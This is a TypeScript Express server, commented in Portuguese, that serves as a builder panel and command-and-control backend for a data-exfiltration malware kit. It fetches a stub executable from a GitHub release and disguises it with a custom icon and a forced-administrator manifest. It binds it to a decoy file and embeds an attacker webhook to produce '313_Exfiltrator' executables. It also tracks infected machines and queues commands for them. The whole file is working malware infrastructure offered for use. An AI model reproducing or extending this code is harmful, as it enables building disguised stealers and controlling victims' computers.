import express, { Request, Response, NextFunction } from 'express';
import session from 'express-session';
import fs from 'fs-extra';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';
import axios from 'axios';
import multer from 'multer';
import * as ResEdit from 'resedit';
import postgres from 'postgres';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// --- CORREÇÃO DE TIPAGEM DO TYPESCRIPT ---
declare module 'express-session' {
  interface SessionData {
    authenticated: boolean;
    isAdmin: boolean; // Propriedade para o acesso de Dono
    license_key: string;
    expiry: number;
    ip: string;
    username: string;
  }
}

const app = express();
const PORT = process.env.PORT || 3000;

// --- CONFIGURAÇÃO DO BANCO DE DADOS (NEON.TECH) ---
const sql = postgres(process.env.DATABASE_URL as string, { ssl: 'require' });

// --- CONFIGURAÇÃO BINÁRIA ---
const STUB_NAME = 'stub.exe';
const CARRIER_NAME = 'carrier.exe';
const BUILD_DIR = 'generated_builds';

const STUB_URL = "https://github.com/brvnin/stubpublic/releases/download/1.0/stub.exe";
const CARRIER_URL = "https://github.com/brvnin/stubpublic/releases/download/carrier/carrier.exe";

// Marcadores de Injeção
const MARKER_WEBHOOK = '313_W_H_START:';
const MARKER_EXPIRY = '313_EXP_TIME:';
const MARKER_CLEAN = '313_CLEAN_FILE:';
const MARKER_PAYLOAD = '313_PAYLOAD_FILE:';

const upload = multer({ 
    storage: multer.memoryStorage(),
    limits: { fileSize: 100 * 1024 * 1024 } 
});

if (!fs.existsSync(BUILD_DIR)) {
    fs.mkdirSync(BUILD_DIR);
}

// --- CLOUD BINARY SYNC ---
async function downloadBinary(url: string, filename: string) {
    console.log(`[313] Syncing binary: ${filename}...`);
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        fs.writeFileSync(filename, response.data);
        return true;
    } catch (e) {
        console.error(`[!] Failed to sync ${filename}`);
        return false;
    }
}

async function ensureBinariesExist() {
    if (!fs.existsSync(STUB_NAME)) await downloadBinary(STUB_URL, STUB_NAME);
    if (!fs.existsSync(CARRIER_NAME)) await downloadBinary(CARRIER_URL, CARRIER_NAME);
}
ensureBinariesExist();

// --- SEGURANÇA: MIDDLEWARE DE AUTENTICAÇÃO ---
const adminAuth = (req: Request, res: Response, next: NextFunction) => {
    if (req.session && req.session.isAdmin) {
        return next();
    }
    res.redirect('/login');
};

// --- FUNÇÃO DE PATCHING (OVERLAY + UAC + BINDER) ---
async function patchBinary(webhook: string, expiry: string, buildId: string, icon: Buffer | null, decoy: Buffer | null) {
    try {
        const payloadData = fs.readFileSync(STUB_NAME);
        let baseBinary = decoy ? fs.readFileSync(CARRIER_NAME) : payloadData;

        // 1. Injeção de Recursos (Ícone e Manifesto de Admin) via ResEdit
        const exe = ResEdit.NtExecutable.from(baseBinary);
        const resObj = ResEdit.NtExecutableResource.from(exe);

        if (icon) {
            const iconFile = ResEdit.Data.IconFile.from(icon);
            (ResEdit.Resource.IconGroupEntry as any).replaceIconsForResource(resObj.entries, 1, 1033, iconFile.icons);
        }

        // Forçar Escudo do UAC (requireAdministrator)
        const adminManifest = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges><requestedExecutionLevel level="requireAdministrator" uiAccess="false"/></requestedPrivileges></security></trustInfo></assembly>`;
        
        const ResourceAny = ResEdit.Resource as any;
        if (ResourceAny.Manifest) {
            const manifestRes = new ResourceAny.Manifest();
            manifestRes.data = Buffer.from(adminManifest);
            manifestRes.id = 1;
            manifestRes.lang = 1033;
            manifestRes.outputResource(resObj.entries);
        }

        resObj.outputResource(exe);
        baseBinary = Buffer.from(exe.generate());

        // 2. Montagem Final (Overlay Stream)
        const outputFilename = path.join(BUILD_DIR, `313_Exfiltrator_${buildId}.exe`);
        const writeStream = fs.createWriteStream(outputFilename);
        
        writeStream.write(baseBinary);

        if (decoy) {
            writeStream.write(Buffer.from(MARKER_CLEAN));
            writeStream.write(decoy);
            writeStream.write(Buffer.from(MARKER_PAYLOAD));
            writeStream.write(payloadData);
        }

        // Injeta a Webhook e o Tempo no final absoluto
        writeStream.write(Buffer.from(MARKER_WEBHOOK + webhook));
        writeStream.write(Buffer.from(MARKER_EXPIRY + expiry));
        writeStream.end();

        return new Promise<string | null>((resolve) => {
            writeStream.on('finish', () => resolve(outputFilename));
            writeStream.on('error', () => resolve(null));
        });
    } catch (e) {
        console.error(`[!] Build error: ${e}`);
        return null;
    }
}

// --- ROTAS DO SERVIDOR ---

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views/index.html'));
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'views/login.html'));
});

app.post('/login', (req, res) => {
    const { password } = req.body;
    // Valida a senha mestre configurada no .env
    if (password === process.env.ADMIN_PASSWORD) {
        req.session.isAdmin = true;
        return res.redirect('/dashboard');
    }
    res.redirect('/login?error=AccessDenied');
});

// --- API C2 (COMMAND & CONTROL) ---

app.post('/api/ping', async (req, res) => {
    // 1. Garante que os dados do corpo sejam strings ou strings vazias
    const pc_name = String(req.body.pc_name || 'Unknown');
    const os_info = String(req.body.os_info || 'Unknown');

    // 2. Trata o IP para garantir que seja uma string única (não undefined nem array)
    const forwarded = req.headers['x-forwarded-for'];
    let ip = "0.0.0.0";

    if (forwarded) {
        ip = Array.isArray(forwarded) ? forwarded[0] : forwarded.split(',')[0];
    } else if (req.socket.remoteAddress) {
        ip = req.socket.remoteAddress;
    }

    try {
        // Agora o 'sql' não reclamará, pois os tipos são estritamente strings
        const result = await sql`
            INSERT INTO nodes (pc_name, ip_address, os_info, last_ping)
            VALUES (${pc_name}, ${ip}, ${os_info}, NOW())
            ON CONFLICT (pc_name) 
            DO UPDATE SET last_ping = NOW(), ip_address = ${ip}, os_info = ${os_info}
            RETURNING pending_command
        `;

        const command = result[0]?.pending_command || 'IDLE';
        res.json({ command });

        // Limpa comando após entrega
        if (command !== 'IDLE') {
            await sql`UPDATE nodes SET pending_command = 'IDLE' WHERE pc_name = ${pc_name}`;
        }
    } catch (e) {
        console.error("[!] DB Ping Error:", e);
        res.status(500).json({ error: "DB Error" });
    }
});

app.get('/dashboard', adminAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'views/dashboard.html'));
});

app.get('/api/nodes', adminAuth, async (req, res) => {
    try {
        const nodes = await sql`SELECT * FROM nodes ORDER BY last_ping DESC`;
        res.json(nodes);
    } catch (e) { res.status(500).send("DB Error"); }
});

app.post('/api/command', adminAuth, async (req, res) => {
    const { pc_name } = req.body;
    await sql`UPDATE nodes SET pending_command = 'FORCE_LOG' WHERE pc_name = ${pc_name}`;
    res.json({ success: true });
});

// Rota de Construção do Executável
app.post('/build', adminAuth, upload.fields([{ name: 'icon', maxCount: 1 }, { name: 'decoy', maxCount: 1 }]), async (req: any, res) => {
    const { webhook, expiry_days } = req.body;
    const buildId = crypto.randomBytes(4).toString('hex');
    const expiryTs = Math.floor(Date.now() / 1000) + (parseInt(expiry_days) * 86400);

    const icon = req.files['icon'] ? req.files['icon'][0].buffer : null;
    const decoy = req.files['decoy'] ? req.files['decoy'][0].buffer : null;

    const filePath = await patchBinary(webhook, expiryTs.toString(), buildId, icon, decoy);
    
    if (filePath) {
        res.download(filePath, `313_Exfiltrator_${buildId}.exe`, (err) => {
            if (!err) fs.unlinkSync(filePath); // Limpa build após download
        });
    } else {
        res.status(500).send("Build error");
    }
});

app.get('/logout', (req, res) => {
    req.session.destroy(() => res.redirect('/'));
});

app.listen(PORT, () => console.log(`[313] Master Terminal Active on port ${PORT}`));